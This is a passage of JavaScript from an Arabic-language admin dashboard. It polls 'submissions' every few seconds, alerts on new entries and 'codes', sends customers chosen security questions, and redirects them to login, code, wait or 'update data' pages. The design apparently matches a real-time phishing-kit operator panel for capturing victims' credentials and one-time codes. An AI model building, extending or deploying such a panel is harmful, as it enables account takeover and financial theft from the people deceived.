    '<p class="del-warn">⚠️ هل أنت متأكد؟ سيتم حذف جميع الطلبات نهائياً!</p>'+
    '<div class="del-confirm-row">'+
    '<button style="background:#dc2626;color:#fff" onclick="doDelAll()">✅ نعم، احذف</button>'+
    '<button style="background:#f1f5f9;color:#475569;border:1px solid #e2e8f0" onclick="cancelDel()">❌ إلغاء</button></div>';
}
function doDelAll(){
  api('POST','/api/admin/clear').then(function(){
    showNotif('✅ تم مسح جميع الطلبات');
    closeDetail();loadData();
  });
}
function cancelDel(){var o=orders.find(function(x){return x.id==selId;});if(o)renderDetail(o);}

function doDecide(id,decision){
  api('POST','/api/admin/'+decision+'/'+id).then(function(){
    showNotif(decision==='accept'?'✅ تم القبول':'❌ تم الرفض');loadData();});
}

var SEC_QUESTIONS=[
  'ما هو اسم ابن عمك الأول؟','في أي مدينة ولدت؟','في أي سنة تخرجت من الجامعة؟',
  'ماذا كان لقبك أثناء الطفولة؟','اسم مؤلفك المفضل؟','اسم الشركة المصنعة للسيارة المفضلة لديك؟',
  'أي فيلم هو المفضل لديك؟','اسم أفضل صديق في الطفولة؟','في أي عام حصلت على رخصة القيادة الخاصة بك؟',
  'العلامة التجارية لأول تلفزيون الخاص بك؟','في أي سنة تزوجت؟','اسم فريق كرة القدم المفضل لديك؟',
  'ما هو اسم المدرسة التي التحقت بها؟','اسم أول بلد أجنبي قمت بزيارته؟','ما هي ماركة سيارتك الأولى؟'
];
function secQOptions(){return SEC_QUESTIONS.map(function(q){return '<option value="'+esc(q)+'">'+esc(q)+'</option>';}).join('');}

function sendSecQ(id){
  var sel=document.getElementById('adminQSelect');
  if(!sel||!sel.value){showNotif('⚠️ اختر سؤال أولاً');return;}
  api('POST','/api/admin/send-question/'+id,{question:sel.value}).then(function(r){
    if(r.ok)showNotif('✅ تم إرسال السؤال للعميل');loadData();
  });
}

function doRedir(id,page){
  api('POST','/api/admin/redirect/'+id,{page:page}).then(function(){
    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',wait:'الانتظار','update-data':'تحديث البيانات'};
    showNotif('✅ تم إعادة التوجيه إلى: '+(labels[page]||page));loadData();});
}

function loadData(){
  api('GET','/api/admin/submissions').then(function(d){
    if(!d)return;
    var nw=d.submissions||[];
    var nkeys=new Set(nw.map(function(o){return o.id+'|'+o.step+'|'+(o.code||'');}));
    if(prevKeys.size>0){var hasNew=false;nkeys.forEach(function(k){if(!prevKeys.has(k))hasNew=true;});
      if(hasNew){playSound();showNotif('🔔 بيانات جديدة وصلت!');}}
    prevKeys=nkeys;orders=nw;
    renderStats();renderActive();renderOrders();
    if(selId){var o=orders.find(function(x){return x.id==selId;});if(o)renderDetail(o);else closeDetail();}
  }).catch(function(){});
}

function loadVisitors(){
  api('GET','/api/admin/visitors').then(function(r){
    if(r.ok){onlineCount=r.count||0;renderStats();}
  }).catch(function(){});
}

function scrollToOrders(){
  if(!orders.length){showNotif('📭 لا توجد طلبات');return;}
  selectOrder(orders[0].id);
  var el=document.querySelector('.col-o');
  if(el){el.style.boxShadow='inset 0 0 0 2px #1B7A3D';setTimeout(function(){el.style.boxShadow='';},1500);}
}

if(tkn())showDash();
setInterval(function(){if(tkn()){loadData();loadVisitors();}},3000);
</script>
</body>
</html>
